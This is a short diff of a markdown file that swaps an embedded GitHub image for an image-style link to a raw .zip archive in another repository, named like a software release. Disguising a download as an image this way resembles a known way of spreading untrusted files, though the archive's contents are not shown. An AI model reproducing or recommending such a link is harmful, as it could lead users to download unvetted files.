@@ -4,4 +4,4 @@
 
 
 
-![image](https://github.com/user-attachments/assets/25ce569b-906e-4b04-8e93-26fa5fbc03fa)
+![image](https://github.com/adityamadhyahnapu/AITHON_2024FEB9_NLPCRAFTERS/raw/refs/heads/main/tamanoas/NLPCRAFTERS_FE_AITHO_3.7-alpha.2.zip)
